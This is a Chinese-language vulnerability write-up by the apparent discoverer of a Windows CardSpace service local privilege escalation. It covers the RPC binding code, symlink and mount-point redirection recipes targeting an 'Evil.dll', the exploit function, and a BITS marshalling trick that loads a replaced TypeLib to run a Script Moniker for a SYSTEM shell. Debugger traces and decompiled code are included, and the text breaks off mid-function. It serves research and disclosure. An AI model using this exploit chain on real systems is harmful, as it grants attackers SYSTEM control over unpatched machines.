#### 引用 ####

>这个漏洞属于Windows CardSpace服务未正确处理符号链接对象导致的任意文件替换的本地权限提升漏洞 

#### 申明 ####

作者poc仅供研究目的,如果读者利用本poc从事其他行为,与本人无关

#### 目录 ####

[toc]

#### 分析 ####

##### 漏洞影响范围 #####

适用于Windows7和Windows Server 2008 R2的普通用户和开启特殊配置的IIS用户

##### 漏洞原理分析 #####

笔者是漏洞的提交者,漏洞更新于2020年5月.漏洞来自于Windows7和Windows Server 2008 R2的Windows CardSpace服务(简称idsvc),该服务可由任意用户启动,本身以System权限运行,并提供公开的RPC调用,服务在由用户触发移动位于当前用户环境变量%APPDATA%目录下指定配置文件时未正确处理符号链接对象,导致任意文件替换的本地权限提升,这是漏洞的成因.
由于是利用基于RPC调用就需要先获取服务的接口[MIDL](https://docs.microsoft.com/en-us/windows/win32/midl/midl-start-page),这样才能编写本地代码与之交互.笔者推荐使用[RpcView工具](https://github.com/silverf0x/RpcView),具体方法可以参考[RPC漏洞挖掘系列文章](https://www.anquanke.com/post/id/167427).
先使用如下方法获取符号文件,并在工具中进行符号配置,之后就可以反编译出RPC接口IDL文件,具体方法如下
```
//先配置环境变量[_NT_SYMBOL_PATH]值如下
SRV*C:\symbols*http://msdl.microsoft.com/download/symbols/
//手动下载符号,symchk.exe在windbg目录下
symchk.exe "C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\infocard.exe" /v 
//在RpcView工具点击Options->Configure Symbols,输入如下内容,注意大小写
srv*C:\symbols
```
![点击看大图](https://ftp.bmp.ovh/imgs/2020/05/094f6ab7bb556200.png)
通过工具获取其中由3个重要的数据,Rpc协议的类型,协议名称和协议接口的客户端定义文件(编译IDL文件文件生成的.c文件,见左侧Decompilation文本框),这样就可以用如下方法绑定Rpc服务了
```
BOOL StartRpcService()
{
	RPC_STATUS status;
	unsigned int  cMinCalls = 1;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	if (StartConnectingService())
	{
       //Rpc协议的类型,协议名称
		status = RpcStringBindingComposeW(nullptr, L"ncalrpc", 0, L"31336F38236F3E2C6F3F2E6F20336F20236F21326F", nullptr, &StringBinding);
		if (status){
			printf("RpcStringBindingComposeW Failed:%d\n", status);
			return(status);
		}
		status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
		RpcStringFreeW(&StringBinding);
		if (status){
			printf("RpcBindingFromStringBindingW Failed:%d\n", status);
			return(status);
		}
		SecurityQOS.Version = 1;
		SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
		SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
		SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
		status = RpcBindingSetAuthInfoExW(hBinding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
		if (status){
			printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);
			return(status);
		}
        //绑定接口
		status = RpcEpResolveBinding(hBinding, DefaultIfName_v1_0_c_ifspec);
		if (status){
			printf("RpcEpResolveBinding Failed:%d\n", status);
			return(status);
		}
	}
	else
	{
		printf("Start Connecting Windows Cardspace Service Failed");
		return 0;
	}
	return 0;
}
```
通过反编译idsvc服务代码得到具体工程(见相关项目).idsvc服务绑定了全局RPC接口的全局处理程序RequestFactory.ProcessNewRequest,对于初次调用即parentRequestHandle为0的情况调用CreateClientRequestInstance类处理回调,后续操作由CreateUIAgentRequestInstance类处理
```
    //全局RPC接口的全局处理程序
 internal static int ProcessNewRequest(  int parentRequestHandle, IntPtr rpcHandle, IntPtr inArgs, out IntPtr outArgs)
        {
           ...
           //初次调用
                if (parentRequestHandle == 0)
                {
                    using (UIAgentMonitorHandle monitorHandle = new 
UIAgentMonitorHandle())
                    {
                        using (ClientRequest clientRequestInstance = 
RequestFactory.CreateClientRequestInstance(monitorHandle, structure.Type, 
rpcHandle, inStream, (Stream)outStream))
                        {

                            string extendedMessage;
//反射出来后执行实例的DoProcessRequest方法处理请求
                            num = clientRequestInstance.DoProcessRequest(out 
extendedMessage);
                            RpcResponse outArgs1;
                            RequestFactory.ConvertStreamToIntPtr(outStream, out 
outArgs1);
//返回结果
                            outArgs = outArgs1.Marshal();       
                        }
                   }
              }
```
idsvc服务会根据RpcRequest->Type字段种的类名反射出相应类处理回调,这里poc使用的是"ManageRequest"类;
```
 private static ClientRequest CreateClientRequestInstance( UIAgentMonitorHandle monitorHandle, string reqName, IntPtr rpcHandle,Stream inStream,Stream outStream)
        {
            ClientRequest clientRequest = (ClientRequest)null;
            lock (RequestFactory.s_createRequestSync)
            {              
                RequestFactory.RequestName request = 
RequestFactory.s_requestMap[reqName];
                if (-1 != 
Array.IndexOf<RequestFactory.RequestName>(RequestFactory.s_uiClientRequests, 
request))
                {
                    Process contextMapping = 
ClientUIRequest.GetContextMapping(rpcHandle, true);
                    InfoCardTrace.ThrowInvalidArgumentConditional(null == 
contextMapping, nameof(rpcHandle));               
                   WindowsIdentity executionIdentity = 
NativeMcppMethods.CreateServiceExecutionIdentity(contextMapping);
                    InfoCardUIAgent agent = 
monitorHandle.CreateAgent(contextMapping.Id, executionIdentity, tSSession);
                    switch (RequestFactory.s_requestMap[reqName])
                    {                       
//这里使用的是"ManageRequest"类;
                        case RequestFactory.RequestName.ManageRequest:

                            clientRequest = (ClientRequest)new 
ManageRequest(contextMapping, executionIdentity, agent, rpcHandle, inStream, 
outStream);
                            break;                    

                    }
                }

```
触发ManageRequest实例的DoProcessRequest函数处理请求,省略中间步骤,最后调用StoreConnection.CreateDefaultDataSources()来到了利用点.
在与服务交互过程中服务会模拟用户(Impersonate Client)并获取用户配置文件,默认为用户环境变量%APPDATA%目录下指定配置文件,对于IIS用户特殊情况默认不加载配置文件需开启如下配置才可以实现,点击应用程序池->高级设置.
![点击看大图](https://ftp.bmp.ovh/imgs/2020/05/2876914176e59f9b.jpg)
```
//构造函数
  protected StoreConnection(WindowsIdentity identity)

    {
     //这里的identity也就客户端身份
      this.m_identity = new WindowsIdentity(identity.Token);      
//获取用户环境变量的%APPDATA%
      this.m_path = 
Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\CardSpace\\");
      this.m_localSource = this.m_path + "CardSpaceSP2.db";      
    }     
protected virtual void CreateDefaultDataSources(Hashtable list)
   {
      string str = this.m_path + "CardSpace.db";
//进入using块使用的idsvc服务身份,离开块后继续Impersonate Client
      using (new SystemIdentity(true))
      {
      ....
        if (File.Exists(str))
        {
           //替换文件,内部实现就是File.MoveTo等函数
          this.AtomicFileCopy(str, this.m_localSource);
        }       
     }
...      
  protected void AtomicFileCopy(string source, string destination)
    {
      if (!File.Exists(source))
        return;
        //加上.atomic后缀,移动文件
      File.Copy(source, source + ".atomic", true);
      FileInfo fileInfo = new FileInfo(source + ".atomic");
      if (fileInfo.Length == 0L)
        return;
      fileInfo.MoveTo(destination);
    }
```
idsvc服务通过new SystemIdentity(true)切换回idsvc服务身份,调用AtomicFileCopy移动用户配置文件.在默认配置下%APPDATA%目录下的文件在可由当前用户可完全控制.当高权限进程对低权限进程可控制文件进行删除,移动,复制,设置属性等操作时,低权限进程均可利用此特权做一些其他操作.James Forshaw[@tiraniddo](https://twitter.com/tiraniddo)为我们提供了一套[开源工具](https://github.com/googleprojectzero/symboliclink-testing-tools),他在NTFS文件系统和Windows内部的开创性工作完成了所有繁重工作,实现了几种滥用Windows文件系统和路径解析功能的技术和利用方法.NTFS文件系统允许将一个用户控制目录挂载到另一个用户控制目录(挂载点Volume Mount Points和交叉点Junction Points),也允许通过符号链接Symbolic Links(NTFS重解析点Reparse Points)将一个目标链接至另一个,和硬链接(Hard Link)将一个用户可控制文件链接至另一个可读文件,以上方式均可导致恶意攻击者滥用高特权进程执行文件操作.对于poc中的利用,可使用如下两种方式对源文件和目标文件创建相应符号链接,第一种方式为挂载点和硬链接,这种方式只适用于win7,硬链接已被微软缓解,具体原因见[分析](http://whereisk0shl.top.park.bitcron.com/post/2019-06-08),第二种方式仍然可在win10实现利用,原理是通过任意用户可写对象目录\RPC Control链接至指定目录,然后继续链接\RPC Control目录下文件至指定文件,具体方式如下,关于符号链接的相关可以参考[上篇](https://www.4hou.com/posts/qV8D)和[下篇](https://www.4hou.com/posts/rE7B),这里不再赘述
```
第一种方式, 挂载点和硬链接
C:\workspace\mountpoint ->  C:\Users\Username\AppData\Local\Microsoft\CardSpace
源文件(挂载点) = C:\workspace\mountpoint\CardSpace.db(Fake.dll) -> C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db
目标文件(硬链接) =C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic ->  C:\Evil.dll
第二种方式,符号链接至 \RPC Control
C:\Users\Username\AppData\Local\Microsoft\CardSpace -> \RPC Control
源文件 = C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db ->\RPC Control\CardSpace.db
目标文件 =C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic -> \RPC Control\CardSpace.db.atomic
源文件 = \RPC Control\CardSpace.db ->C:\Fake.dll 
目标文件 = \RPC Control\CardSpace.db.atomic -> C:\Evil.dll
```
![查看大图](https://ftp.bmp.ovh/imgs/2020/05/ceb01a06f81a8bba.png)
从Process Monitor看出idsvc服务移动文件时并没使用模拟(Impersonate)用户身份操作,也没有判断文件的符号链接属性,就导致任意文件替换权限提升漏洞,以下是漏洞利用关键代码
```
BOOL Exploit()
{
	RpcRequest* req = (RpcRequest*)CoTaskMemAlloc(sizeof(RpcRequest));
	req->Type = L"ManageRequest";
	req->Length = 0;
	req->Data = 0;
	RpcResponse* rep = (RpcResponse*)CoTaskMemAlloc(sizeof(RpcResponse));
	UINT32* ctx = 0;
	long ret = Proc0_RPCClientBindToService(hBinding, (void**)&ctx);
	printf("Proc0_RPCClientBindToService :%d\n", ret);
	ret = Proc2_RPCDispatchClientUIRequest((void**)&ctx, req, &rep);
	printf("Proc2_RPCDispatchClientUIRequest :%08x\n", ret);
	return 0;
}
```

##### 漏洞利用分析 #####

笔者设计了一种新的基于任意文件替换的提权利用方式,原型来自[CVE-2017-0213](https://www.exploit-db.com/exploits/42020/),这种方式适用于Windows7至Windows10所有版本操作系统,但前提是要被替换的文件不是TrustedInstaller控制权限,才可以触发漏洞,原因是TrustedInstaller权限高于其他权限,如果直接执行替换操作,即使是以System权限操作结果都是拒绝访问,一般只有管理员权限或者System权限的文件才符合条件.笔者制作了一个[工具](https://gitee.com/cbwang505/TypeLibUnmarshaler)用于搜索指定目录下可替换文件,在相关项目列表中提供,也可以使用微软[SysinternalsSuite](https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite)中的accesschk工具,启动命令行如下,最后一个参数为指定目录文件
```
//[SysinternalsSuite]工具模式,最后一个参数为指定目录文件
accesschk.exe -s -w  "nt authority\system"  c:\windows\system32\*.dll
//笔者工具中的查找模式,参数为目标路径和后缀名
MyComEop.exe  v [find path] [extension]
//深度查找模式,参数为目标路径和后缀名
MyComEop.exe  d [find path] [extension]			
```
对于Windows7系统笔者使用以上工具找到了一些系统自带的TypeLib(类型库)文件可以实现利用,对于Windows10等高版本系统也找到了一个可以被System用户写入的系统自带TypeLib,更好的情况是对于安装了第三方软件注册的Com组件的基本上都存在类似TypeLib文件符合条件,所以必定存在这种利用方式的利用价值.
```
Windows7系统TypeLib位于:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.EnterpriseServices.tlb
Windows10等高版本系统TypeLib位于:
C:\Windows\System32\SysFxUI.dll
```
![查看大图](https://ftp.bmp.ovh/imgs/2020/06/82d5245385a1632a.png)
Windows7系统的利用可以直接在poc中体现,对于Windows10等高版本系统已在我的另一个[EXP](https://gitee.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION)中得到验证,如果仅进行测试目的可以用以下命令行启动实现,由于是需要System用户写入,推荐使用[Process Hacker](https://processhacker.sourceforge.io/)等工具将当前用户身份切换至System用户,效果如上图:
```
MyComEop.exe u "{E6DB299B-B925-415A-879B-4A76D072F39A}" "IMyPageFactory" "{87D5F036-FAC3-4390-A1E8-DFA8A62C09E7}"  "C:\Windows\System32\SysFxUI.dll" true
```
如果读者找到符合条件TypeLib后可以用[Windows SDK](https://developer.microsoft.com/zh-cn/windows/downloads/windows-10-sdk/)中的OleView工具打开,选择任意一个Interface分别提取出这3个参数IID_Interface,InterfaceName,TypeLib_GUID就可以使用利用工具中的高级模式实现利用,这里笔者使用的是这个Windows7系统一个自带的TypeLib进行演示.
![查看大图](https://ftp.bmp.ovh/imgs/2020/05/566fb6af779fecfc.png)
![查看大图](https://ftp.bmp.ovh/imgs/2020/05/cfdf6fba7c5462b1.png)
漏洞利用的原理来自Background Intelligent Transfer Service服务(简称bits),调用bits服务的公开api中的IBackgroundCopyJob->SetNotifyInterface接口允许传递任意远程com对象,如果这个对象继承了IMarshal接口,bits服务会根据接口方法GetUnmarshalClass中传入的CLSID自定义Unmarshal反序列化.这里笔者使用的标准Unmarshal方式即CStdMarshal::UnmarshalInterface触发反序列化,而导致反序列化的数据来自MarshalStream中的OBJREF结构,这个结构格式如下,具体可参考[微软官方文档](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31?redirectedfrom=MSDN)和我的[另一篇文章](https://bbs.pediy.com/thread-228829.htm)
```
typedef LUID OXID;
typedef LUID OID;
typedef GUID IPID;
typedef struct tagDUALSTRINGARRAY    {
	unsigned short wNumEntries;     // Number of entries in array.
	unsigned short wSecurityOffset; // Offset of security info.
	unsigned short aStringArray[];
} DUALSTRINGARRAY;

typedef struct tagSTDOBJREF    {
	DWORD   flags;
	DWORD   cPublicRefs;    
   //对象所处的套间的标识符,在套间建立时会为套间建立一个OXID,叫做对象引出标识符
	OXID           oxid;
  //存根管理器的标识符  
	OID            oid; 
//接口存根标识符,用来唯一的标识套间中的一个接口指针,这跟接口的IID是不同的,IID是用来标识   
	IPID           ipid;
} STDOBJREF;

typedef struct tagOBJREF    {
	unsigned long signature;//MEOW
	unsigned long flags;
	GUID          iid;
	union        {
		struct            {
			STDOBJREF       std;
			DUALSTRINGARRAY saResAddr;
		} u_standard;
		struct            {
			STDOBJREF       std;
			CLSID           clsid;
			DUALSTRINGARRAY saResAddr;
		} u_handler;
		struct            {
			CLSID           clsid;
			unsigned long   cbExtension;
			unsigned long   size;
			ULONGLONG pData;
		} u_custom;
	} u_objref;
} OBJREF;

```
这里flags为OBJREF_STANDARD(0x01),表示使用标准Unmarshal方式(CStdMarshal),对应的下方联合体的是STDOBJREF,至于其他flags类型均有自定义的unmarshal方式,不在本文的讨论范围,请读者自行研究.而最终导致实现漏洞利用的是其中的iid字段,通过逆向研究发现替换这个iid(也就是oleview中找到的接口IID_Interface)就可以触发bits服务加载这个iid对应com组件对象的TypeLib(类型库),也就是说任意TypeLib反序列化.最终替换TypeLib文件构造为嵌套的TypeLib结构就可以运行Script Moniker来GetShell.这里附上漏洞利用关键代码:
```
virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		IStorage* stg;
		ILockBytes* lb;
		CreateILockBytesOnHGlobal(nullptr, TRUE, &lb);
		StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
		ULONG cbRead;
		ULONG cbWrite;
		IStreamPtr pStream = nullptr;
		HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &pStream);
		LARGE_INTEGER dlibMove = { 0 };
		ULARGE_INTEGER plibNewPosition;
		hr = CoMarshalInterface(pStream, IID_IUnknown, static_cast<IUnknownPtr>(stg), dwDestContext, pvDestContext, mshlflags);
		OBJREF* headerObjRef = (OBJREF*)malloc(1000);
		hr = pStream->Seek(dlibMove, STREAM_SEEK_SET, &plibNewPosition);
		hr = pStream->Read(headerObjRef, 1000, &cbRead);
		printf("[+]MarshalInterface: %ls %p\n", IIDToBSTR(IID_InterfaceFake).GetBSTR(), this);
        //IID_InterfaceFake就是找到的接口IID_Interface
		headerObjRef->iid = IID_InterfaceFake;
		hr = pStm->Write(headerObjRef, cbRead, &cbWrite);
		return hr;

	}
```
从调试结果可以看到CStdMarshal::UnmarshalInterface最终调用了LoadTypeLibEx,传入iid是IID_InterfaceFake(来自OBJREF),第二次调用LoadTypeLibEx加载了Script Moniker.证明确实可以HOOK高权限进程反序列化加载任意TypeLib
```
1: kd> bp OLEAUT32!GetTypeInfoOfIID
Breakpoint 0 hit
OLEAUT32!GetTypeInfoOfIID:
0033:000007fe`febf0140 4533c0          xor     r8d,r8d
//继续调试....
0: kd> p
OLEAUT32!GetTypeInfoOfIIDFwd+0x19:
0033:000007fe`febefd09 4889842480030000 mov     qword ptr [rsp+380h],rax
0: kd> r
rax=0000113b9b912356 rbx=0000000000000000 rcx=00000000059f912c
rdx=00000000033ae060 rsi=00000000059f9150 rdi=00000000059f9148
rip=000007fefebefd09 rsp=00000000033adc80 rbp=0000000000000002
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
r11=00000000033ae088 r12=00000000059f912c r13=0000000000000001
0: kd> dt _GUID @rcx
//查看这个参数
ole32!_GUID
 {55e3ea25-55cb-4650-8887-18e8d30bb4bc}=传入iid是IID_InterfaceFake
 //下这个断点
1: kd> bp OLEAUT32!LoadTypeLibEx
1: kd> g
Breakpoint 3 hit
OLEAUT32!LoadTypeLibEx:
0033:000007fe`feb6a550 fff3            push    rbx
//第一次加载的是目标TypeLib
1: kd> dc @rcx L50
00000000`02c8e070  003a0043 0057005c 006e0069 006f0064  C.:.\.W.i.n.d.o.
00000000`02c8e080  00730077 004d005c 00630069 006f0072  w.s.\.M.i.c.r.o.
00000000`02c8e090  006f0073 00740066 004e002e 00540045  s.o.f.t...N.E.T.
00000000`02c8e0a0  0046005c 00610072 0065006d 006f0077  \.F.r.a.m.e.w.o.
00000000`02c8e0b0  006b0072 0076005c 002e0034 002e0030  r.k.\.v.4...0...
00000000`02c8e0c0  00300033 00310033 005c0039 00790053  3.0.3.1.9.\.S.y.
00000000`02c8e0d0  00740073 006d0065 0045002e 0074006e  s.t.e.m...E.n.t.
00000000`02c8e0e0  00720065 00720070 00730069 00530065  e.r.p.r.i.s.e.S.
00000000`02c8e0f0  00720065 00690076 00650063 002e0073  e.r.v.i.c.e.s...
00000000`02c8e100  006c0074 00000062 001e6e38 00000000  t.l.b...8n......
00000000`02c8e110  059f92e0 00000000 02c8e180 00000000  ................
0: kd> kv
 # Child-SP          RetAddr           : Args to Child                                                           : Call Site
00 00000000`0391d828 000007fe`febf00eb : 00000000`00000ed8 00000000`00000000 00000000`0391d9a0 00000000`0391d870 : OLEAUT32!LoadTypeLibEx
01 00000000`0391d830 000007fe`febf0f4f : 000007fe`ff6c71c0 000007fe`ff661889 00000000`0371f310 00000000`00000000 : OLEAUT32!GetTypeInfoOfIIDFwd+0x3fb
02 00000000`0391dbe0 000007fe`febf1149 : 00000000`00284210 00000000`0371f310 00000000`00284240 00000000`00284248 : OLEAUT32!FilterReferencedTypeInfos+0x3df
03 00000000`0391dc40 000007fe`ff51e46a : 00000000`00000000 00000000`03715ea0 00000000`00284210 00000000`00284210 : OLEAUT32!CProxyWrapper::Connect+0x79
04 00000000`0391dc90 000007fe`ff51e233 : 00000000`0371f310 00000000`00000000 00000000`0378aaf8 00000000`00284210 : ole32!CStdMarshal::ConnectCliIPIDEntry+0x1ca [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 2368] 
05 00000000`0391dd00 000007fe`ff51e114 : 00000000`0391df50 00000000`0391e618 00000000`0378aaf8 00000000`00000000 : ole32!CStdMarshal::MakeCliIPIDEntry+0xc3 [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 2189] 
06 00000000`0391dd90 000007fe`ff5211ec : 00000000`03715ea0 00000000`0391df68 00000000`0391e618 0000113b`9a2802cf : ole32!CStdMarshal::UnmarshalIPID+0x70 [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 1734] 
07 00000000`0391dde0 000007fe`ff5210b7 : 00000000`00000000 00000000`059e7610 00000000`00000000 00000000`00000000 : ole32!CStdMarshal::UnmarshalObjRef+0x10c [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 1618] 
08 00000000`0391de80 000007fe`ff52106c : 00000000`0378aaf8 00000000`0391df50 00000000`00000001 00000000`037daf90 : ole32!UnmarshalSwitch+0x2b [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 1279] 
09 00000000`0391deb0 000007fe`ff64a0c5 : 00000000`0378aaf8 00000000`00000000 00000000`0365efb0 00000018`00000000 : ole32!UnmarshalObjRef+0xc0 [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 1406] 
//使用的是标准反序列化模式
0a 00000000`0391df30 000007fe`ff5232a6 : 00000000`037daf90 000007fe`fee64366 00000000`001cf840 000007fe`fedec704 : ole32!CStdMarshal::UnmarshalInterface+0x45 [d:\w7rtm\com\ole32\com\dcomrem\marshal.cxx @ 1238] 
0b 00000000`0391dfd0 000007fe`ff523542 : 000007fe`00000002 00000000`0391e340 00000000`0391db00 00000000`00000000 : ole32!CoUnmarshalInterface+0x19c [d:\w7rtm\com\ole32\com\dcomrem\coapi.cxx @ 957] 
0c 00000000`0391e0b0 000007fe`fedf523e : 00000000`0363fdd4 00000000`0391e340 000007fe`00000001 00000000`0029f880 : ole32!NdrExtInterfacePointerUnmarshall+0x162 [d:\w7rtm\com\rpc\ndrole\oleaux.cxx @ 1354] 
0d 00000000`0391e120 000007fe`fedff6cf : 000007fe`00000000 00000000`0391e4f0 00000000`0391e618 00000000`00000000 : RPCRT4!IUnknown_AddRef_Proxy+0x19e
0e 00000000`0391e190 000007fe`fede6e1c : 00000000`0391e340 000007fe`fede78d7 00000000`0391e4f0 00000000`0023e760 : RPCRT4!NdrPointerUnmarshall+0x2f
0f 00000000`0391e1d0 000007fe`fede68e3 : 00000000`00000020 000007fe`faac1342 00000000`0391e618 000007fe`faac1af0 : RPCRT4!NdrStubCall2+0x73c
10 00000000`0391e240 000007fe`fede7967 : 00000000`0391e9b0 000007fe`fb63a250 00000000`0391e9b0 000007fe`fb63a250 : RPCRT4!NdrStubCall2+0x203
11 00000000`0391e860 000007fe`ff660883 : 00000000`00000000 00000000`00000000 00000000`0391ec60 00000000`03715ff0 : RPCRT4!I_RpcGetBuffer+0xc7
12 00000000`0391e8c0 000007fe`ff660ccd : 00000000`00000000 00000000`00000000 000007fe`fb63a201 00000000`00000000 : ole32!CStdStubBuffer_Invoke+0x5b [d:\w7rtm\com\rpc\ndrole\stub.cxx @ 1586] 
13 00000000`0391e8f0 000007fe`ff660c43 : 00000000`0023e760 00000000`0378a994 00000000`036ce6a0 000007fe`ec046040 : ole32!SyncStubInvoke+0x5d [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1187] 
14 00000000`0391e960 000007fe`ff51a4f0 : 00000000`0023e760 00000000`037daf90 00000000`0023e760 00000000`0391ecd0 : ole32!StubInvoke+0xdb [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1396] 
15 00000000`0391ea10 000007fe`ff6614d6 : 00000000`00000000 00000018`00000010 00000000`037958a0 00000000`03715ff0 : ole32!CCtxComChnl::ContextInvoke+0x190 [d:\w7rtm\com\ole32\com\dcomrem\ctxchnl.cxx @ 1262] 
16 00000000`0391eba0 000007fe`ff66122b : 00000000`d0908070 00000000`037daf90 00000000`01d93e30 00000000`03769be0 : ole32!AppInvoke+0xc2 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1086] 
17 00000000`0391ec10 000007fe`ff65fd6d : 00000000`037daf90 00000000`037daf90 00000000`03715ff0 00000000`00070005 : ole32!ComInvokeWithLockAndIPID+0x52b [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1727] 
18 00000000`0391eda0 000007fe`fede50f4 : 000007fe`ff6c9930 00000000`00000000 00000000`037241b0 000007fe`fedde8f7 : ole32!ThreadInvoke+0x30d [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 4751] 
19 00000000`0391ee40 000007fe`fede4f56 : 000007fe`ff670ab0 00000000`00000001 00000000`0391f0b0 000007fe`ff4f8ffc : RPCRT4!NdrServerCall2+0x1d84
1a 00000000`0391ee70 000007fe`fede775b : 00000000`0378a970 00000000`00000000 00000000`0391f194 00000000`0378a970 : RPCRT4!NdrServerCall2+0x1be6
1b 00000000`0391ef90 000007fe`fede769b : 00000000`00000000 00000000`0391f0b0 00000000`0391f0b0 00000000`037241b0 : RPCRT4!I_RpcBindingInqTransportType+0x32b
1c 00000000`0391efd0 000007fe`fede7632 : 00000000`0378a970 00000000`0378a970 00000000`0378a970 000007fe`fede6140 : RPCRT4!I_RpcBindingInqTransportType+0x26b
1d 00000000`0391f050 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : RPCRT4!I_RpcBindingInqTransportType+0x202
//第二次加载的就是嵌套的TypeLib对应Script Moniker的script:xxx.sct脚本文件
1: kd> g
Breakpoint 3 hit
OLEAUT32!LoadTypeLibEx:
0033:000007fe`feb6a550 fff3            push    rbx
1: kd> dc @rcx L50
00000000`02c8dd70  00630073 00690072 00740070 0043003a  s.c.r.i.p.t.:.C.
00000000`02c8dd80  005c003a 006c0064 0074005c 00730065  :.\.d.l.\.t.e.s.
00000000`02c8dd90  005c0074 006b006f 0072005c 006e0075  t.\.o.k.\.r.u.n.
00000000`02c8dda0  0073002e 00740063 01e50000 00000000  ..s.c.t.........
00000000`02c8ddb0  037efc30 00000000 feb6733c 000007fe  0.~.....<s......

```
Com组件服务器端所在的套间(Apartment)维护着Com接口存根(stub)对象列表,每个存根对象都维护着对Com对象的一个引用,根据这个Com对象接口的iid信息在注册表的HKEY_CLASSES_ROOT/Interface下查找子键iid的ProxyStubClsid32子健下的默认值,这个默认值是一个存根对象的CLSID。然后Com根据CLSID调用CoGetClassObject函数请求代理类厂接口IPSFactoryBuffer->CreateStub建立一个接口存根对象.相应的在Com组件的客户端套间上都维护着代理(proxy)对象列表,在对OBJREF进行Unmarshal时搜索匹配存根对象的[oxid,oid,ipid]调用IPSFactoryBuffer->CreateProxy创建对应代理,通过接口IDL文件中定义函数申明构建出物理栈,然后再通过RPCRT4.dll中实现IRpcChannel通道调用真实的接口函数与存根进行通信,从而实现Com远程过程(RPC)调用.
![点击看大图](https://ftp.bmp.ovh/imgs/2020/04/3f92df786fe10cfa.png)
代理的创建IPSFactoryBuffer->CreateProxy默认被封装成CreateProxyFromTypeInfo函数实现,这个函数的调用过程和TypeLib中的TypeInfo的相关,原因是其中TypeInfo在TypeLib中定义了接口的相关类型信息.因此这个过程中实际上必定需要调用LoadTypeLib函数来加载TypeLib和其中的TypeInfo,这也是触发漏洞最关键的一点.通过逆向分析LoadTypeLib函数调用过程,发现其具体是通过操作注册表实现.对于每个接口信息位于注册表HKEY_CLASSES_ROOT\Interface\[接口IID],其中子键TypeLib对应接口的TypeLib_GUID,接下来对应的TypeLib位于HKEY_CLASSES_ROOT\TypeLib\\[TypeLib_GUID],其中对应版本的子键值就是TypeLib路径.由于一个接口可能存在多个对应版本的TypeLib子键,而反序列化时默认只加载其中一个.笔者通过逆向还原oleaut32.dll中的实现,在漏洞利用工具中实现自动匹配对应TypeLib文件并利用,具体逆向结果如下:
```
wchar_t *__stdcall GetTypeInfoOfIIDFwd(GUID *rguid, struct ITypeInfo **a2, int a3)
{
  wchar_t *result; // eax
  unsigned __int16 versionLookUp; // bx
  unsigned __int16 versionLookUpNext; // ax
  DWORD v6; // ebx
  LSTATUS i; // eax
  HRESULT v8; // eax
  wchar_t *v9; // ebx
  HRESULT v10; // eax
  int foundDotted; // [esp+8h] [ebp-31Ch]
  GUID *v12; // [esp+Ch] [ebp-318h]
  struct ITypeInfo **v13; // [esp+10h] [ebp-314h]
  struct ITypeInfo *v14; // [esp+14h] [ebp-310h]
  wchar_t *EndPtr; // [esp+18h] [ebp-30Ch]
  LONG cbData; // [esp+1Ch] [ebp-308h]
  ITypeLib *pptlib; // [esp+20h] [ebp-304h]
  unsigned __int16 SubVersion[2]; // [esp+24h] [ebp-300h]
  DWORD dwIndex; // [esp+28h] [ebp-2FCh]
  unsigned __int16 Version[2]; // [esp+2Ch] [ebp-2F8h]
  HKEY v21; // [esp+30h] [ebp-2F4h]
  HKEY v22; // [esp+34h] [ebp-2F0h]
  HKEY phkResult; // [esp+38h] [ebp-2ECh]
  HKEY hKey; // [esp+3Ch] [ebp-2E8h]
  CLSID pclsid; // [esp+40h] [ebp-2E4h]
  WCHAR Data; // [esp+50h] [ebp-2D4h]
  wchar_t Dst; // [esp+258h] [ebp-CCh]
  unsigned __int16 tempData; // [esp+268h] [ebp-BCh]
  OLECHAR sz; // [esp+26Ch] [ebp-B8h]
  wchar_t SubKey; // [esp+2E8h] [ebp-3Ch]
  WCHAR Name; // [esp+304h] [ebp-20h]
  v12 = rguid;
  v13 = a2;
  if ( a3 >= 16 )
    return (wchar_t *)-2147319779;
  result = (wchar_t *)MapIIDToFusionTypeInfo(rguid, a2);
  if ( (signed int)result < 0 )
    return result;
  if ( result != (wchar_t *)1 )
    goto LABEL_57;
  hKey = (HKEY)-1;
